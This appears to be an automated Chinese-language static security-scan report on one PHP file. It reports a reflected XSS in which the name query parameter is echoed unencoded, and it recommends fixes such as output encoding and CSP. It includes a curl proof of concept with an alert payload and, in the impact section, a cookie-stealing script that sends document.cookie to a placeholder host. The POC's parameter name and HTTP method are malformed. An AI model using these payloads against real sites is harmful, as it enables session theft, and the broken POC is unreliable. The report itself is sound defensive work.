# 落日二号乙漏洞挖掘报告 — 20261031-012247-74f9fb

- 生成时间：2026-10-30T17:23:23.159678+00:00
- 输入：`C:\Users\liyuf\Desktop\794\暴风星云裂\053.zip`
- 输入模式：`zip`
- SHA256：`dec73bedc036c1309393989aea493094094031b09deb800e5d4d4666bfc8824e`
- 文件：1（文本 1）
- 语言：php(1)
- 框架：未识别
- 端点：0
- 版本：1.0.0
- 严重度档位：`low`（min_confidence=0.6）
- 确定性规则候选生成：已禁用（zip 模式候选来自 LLM 深挖）
- 策略抑制候选：0 条
- 结构化报告：`report.json`（契约）、`report.schema.json`、`report.sarif`、`report.html`

## 1. 执行摘要

本次汇总仅含 1 条已去重 finding：053.php 第 8 行反射型 XSS（CWE-79，high），$_GET['name'] 未编码直接拼接进 HTML，已附带 POC（HTTP 型，可动态复现）。最高危即该条 high 级 XSS，POC 齐全（with_poc=1/1）。整体攻击面极小（单文件 PHP、11 行、无框架无路由），但 surface_notes 明确指出 sink_hot_files 为空、未提供 053.php 实际代码内容，因此除已确认的 echo 型 XSS 外，其余汇点（include/require、file 系列、unserialize、eval、system/exec、setcookie secure 标志等）均未被静态覆盖，不能据此判定不存在。所有结论均为静态源码推断，未经动态验证。

共 **1** 条 finding；**1** 条已生成 POC；**0** 条二次注入链；**0** 条 Prompt 注入迹象，隔离 **0** 个文件。

> 本管线不执行 POC、不搭建沙箱、不做动态验证。所有 verdict 为 `candidate` 或 `external`，需要在授权环境人工复核；URL 模式的 POC 由落日验证动态执行。

## 2. LLM 安全防护（SafetyGuard）

未检测到 Prompt 注入迹象。

## 2.1 LLM 深挖（LLM-finding / DeepFinder）

- 模式：`on`；工具调用：`0`（无 tools / tool_choice / function calling）
- 送入源码：1 个文件 / 308 字符；截断 0 个
- 模型新增候选：1 条；同批重复合并：0 条；安全校验拒绝：0 条

模型覆盖说明：本次 CODE PACK 仅含单文件 053.php（11 行）。已逐行审计：第 3 行 header 关闭 XSS 过滤；第 6 行读取 $_GET['name']；第 8 行未编码拼接进 HTML 输出，构成反射型 XSS，source→sink 链完整闭合，confidence 0.88。未发现 SQL 查询、文件操作、include/require、命令执行、反序列化、eval 等其它 sink，故无 sql_injection/path_traversal/command_injection/rce 类发现。surface_notes 中提到的 Java 模式（getParameterMap/Runtime.exec 等）不适用于本 PHP 文件。未覆盖范围：缺少 php.ini/Web 服务器配置、部署路径与鉴权上下文，无法判断该脚本是否位于需认证目录；无 composer 依赖清单。$html 变量在片段内未见初始化，属代码质量问题，不影响 XSS 结论。

未覆盖 / 证据缺口：
- 缺少部署路径与访问控制信息，无法确认是否公网可达
- 缺少 php.ini/服务器配置，无法评估 register_globals、错误显示等环境因素
- 无依赖清单，第三方组件攻击面未评估
- $html 变量初始化位置不在片段内

## 3. Findings

### F-1: 053.php 反射型跨站脚本（CWE-79）：$_GET['name'] 未编码直接拼接进 HTML

- **类型**：`xss` / CWE-79
- **严重度**：`high`
- **置信度**：`0.8`
- **结论**：`candidate` / 证据等级 `rule_verified+llm`
- **位置**：`053.php:7-8`
- **来源**：`rule`

**描述**

攻击者通过 HTTP GET 请求向 053.php 提交查询参数 name（源码第 8 行 $_GET[ 'name' ]）。该值未经任何 HTML 实体编码、白名单校验或类型约束，直接以字符串拼接方式追加到累积变量 $html 中（第 8 行：$html .= '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';），随后该 $html 被输出到响应页面。由于注入点位于 <pre> 元素内部的 HTML 文本上下文，攻击者提交 name=<script>...</script> 或 <img src=x onerror=...> 即可闭合/逃逸出预期文本，使浏览器将攻击者控制的标记解析为可执行脚本。校验无效的原因：代码路径上不存在 htmlspecialchars/htmlentities 等输出编码，也不存在对 <、>、引号、事件属性的过滤，属于典型的“直接反射未编码”模式。

**source / sink**

- source：query `request parameter`（053.php）
- sink：053.php:8 	$html .= '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';

**利用链**

| # | 位置 | 描述 | 数据状态 | 绕过原因 |
|---|---|---|---|---|
| 1 | `053.php:8` | 请求参数直接进入 HTML 累积变量；需按 HTML/属性/JS 上下文确认编码 | 语义模式命中 | 需按 notes 中的运行时/跨文件条件复核 |

**POC**

针对 /053（任意方法）的反射型跨站脚本 POC。注入点为查询参数 request parameter，源码 053.php:8 将该参数值直接输出到响应而未做 HTML 编码，payload 使用 TARGET 占位符。

1. **确认目标可达且已获授权**

```http
curl -sS -i 'http://TARGET:8080/053'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 跨站脚本 载荷**

```http
curl -sS -i -X ANY 'http://TARGET:8080/053?request parameter=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
```
预期：响应中脚本未编码，浏览器执行并弹出 document.domain。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**
预期：出现与基线不同的内容、状态码、延迟或副作用

- payload：`<script>alert(document.domain)</script>`
- POC 目录：`poc/SEM-fca2dd504a67`
- 风险提示：POC 叙述未明确标注 source→sink 注入点, 原始 payload 未直接出现在请求文本中，可能经过 URL 编码
- 执行状态：未执行（`executed=False`）

**影响**

反射型 XSS：受害者点击构造好的链接（如 /053.php?name=<script>fetch('//TARGET/steal?c='+document.cookie)</script>）后，脚本在站点源下执行，可窃取会话 Cookie/令牌、以受害者身份发起操作（CSRF 式组合）、篡改页面内容或进行钓鱼跳转；若站点存在管理员访问该页面的场景，可进一步升级为后台操作劫持。

**CVE / CWE 论证**

CWE-79（Improper Neutralization of Input During Web Page Generation，跨站脚本）。外部可达性：注入点为 HTTP GET 查询参数 name，任何未认证访问者均可构造请求；无需认证、无需交互式前置条件（仅需受害者访问链接）；利用链闭合：source（$_GET['name']，053.php:8）→ 无编码拼接进 $html（053.php:8）→ 输出至响应 HTML，形成完整的反射型 XSS 链路。证据等级为源码推断（llm_inferred），未做运行时验证。

**修复建议**

1) 输出编码：在拼接前对 $_GET['name'] 使用 htmlspecialchars($v, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')，或改用模板引擎的自动转义；2) 上下文感知：若同一值还需进入属性/JS/URL 上下文，分别使用对应编码（属性加引号 + ENT_QUOTES，JS 用 json_encode，URL 用 rawurlencode）；3) 输入约束：对 name 施加长度与字符白名单（如仅字母数字与空格），拒绝控制字符；4) 纵深防御：设置 Content-Security-Policy（禁止 inline script）与 HttpOnly/SameSite Cookie，降低被利用后的影响；5) 增加回归测试用例覆盖 <script>、"、'、onerror= 等载荷。

**验证说明**

静态证据：入口 ANY /053；source=query/request parameter；sink=053.php:8；规则 php-html-accumulator。未执行 POC、未搭建沙箱；建议在授权环境人工复核。
链叙事：攻击者构造 GET 请求 /053.php?name=<script>alert(document.domain)</script> → PHP 在 053.php:8 读取 $_GET['name'] → 未做任何编码直接字符串拼接进 $html（'<pre>Hello ' . $_GET['name'] . '</pre>'）→ $html 被写入 HTTP 响应 → 浏览器在站点源下解析并执行注入脚本 → 会话数据泄露/操作劫持。
PocWriter 建议（未采纳，缺少端点 /053）：符合 CWE-79。漏洞位于 053.php:8，外部输入来自查询参数 request parameter，source→sink 链静态闭合且未见有效净化，具备远程触发条件。
POC 备注：仅限授权测试；POC 为文本工件，不执行、不联网。参数名含空格，实际请求中需编码为 request%20parameter。目标地址统一使用 TARGET 占位符，执行前需替换为授权目标。

## 4. 二次注入（SecondOrderAnalyzer）

本次未发现 store→read→sink 闭环的二次注入链。

## 5. AWVS 联动

- 输入模式：`zip`
- 导入结果：0 条
- 关联明细：0 条
- 目标种子：`awvs/targets.json`
- 说明：AWVS 是外部动态扫描器；本管线只导入其结果做佐证，或导出端点供 AWVS 播种。

## 6. 漏洞类型覆盖

| 类型 | CWE | AutoCVE | 本次数量 |
|---|---|---|---|
| `command_injection` | CWE-78 | 是 | 0 |
| `sql_injection` | CWE-89 | 是 | 0 |
| `ssrf` | CWE-918 | 是 | 0 |
| `path_traversal` | CWE-22 | 是 | 0 |
| `deserialization` | CWE-502 | 是 | 0 |
| `ssti` | CWE-1336 | 是 | 0 |
| `auth_bypass` | CWE-287 | 是 | 0 |
| `idor` | CWE-639 | 是 | 0 |
| `xxe` | CWE-611 | 是 | 0 |
| `xss` | CWE-79 | 是 | 1 |
| `business_logic` | CWE-840 | 是 | 0 |
| `other` | CWE-693 | 是 | 0 |
| `rce` | CWE-94 |  | 0 |
| `code_injection` | CWE-94 |  | 0 |
| `expression_injection` | CWE-917 |  | 0 |
| `ldap_injection` | CWE-90 |  | 0 |
| `xpath_injection` | CWE-643 |  | 0 |
| `open_redirect` | CWE-601 |  | 0 |
| `csrf` | CWE-352 |  | 0 |
| `file_upload` | CWE-434 |  | 0 |
| `race_condition` | CWE-367 |  | 0 |
| `weak_crypto` | CWE-327 |  | 0 |
| `weak_hash` | CWE-328 |  | 0 |
| `weak_random` | CWE-330 |  | 0 |
| `hardcoded_secret` | CWE-798 |  | 0 |
| `trust_boundary` | CWE-501 |  | 0 |
| `log_injection` | CWE-117 |  | 0 |
| `insecure_cookie` | CWE-614 |  | 0 |
| `information_disclosure` | CWE-200 |  | 0 |
| `api_info_disclosure` | CWE-200 |  | 0 |
| `captcha_bypass` | CWE-804 |  | 0 |
| `csp` | CWE-693 |  | 0 |
| `weak_id` | CWE-330 |  | 0 |
| `client_side_validation` | CWE-602 |  | 0 |
| `brute_force` | CWE-307 |  | 0 |
| `second_order_injection` | CWE-89 |  | 0 |
| `prompt_injection` | CWE-1426 |  | 0 |

## 7. 运行阶段

| agent | 代号 | 耗时(s) | 使用 LLM |
|---|---|---|---|
| safety_guard | 安全防护 | 3.01 | 是 |
| surface_mapper | 攻击面测绘 | 5.04 | 是 |
| deep_finder | LLM 深挖 | 7.97 | 是 |
| candidate_screener | 候选筛选 | 2.82 | 是 |
| vulnerability_analyzer | 漏洞分析 | 6.44 | 是 |
| second_order_analyzer | 二次注入分析 | 0.0 | 否 |
| poc_writer | POC 生成 | 5.07 | 是 |
| coordinator | 管线协调 | 4.98 | 是 |

## 8. 限制

- 只做源码静态分析，不构建、不部署、不执行 POC、不搭建沙箱；
- finding 的 `verdict` 为 `candidate`，不是动态确认；
- 需要授权环境、人工复核与 AWVS 结果才能升级为 confirmed；
- 被 SafetyGuard 隔离的文件正文不会进入 LLM；隔离文件不会产生静态候选。
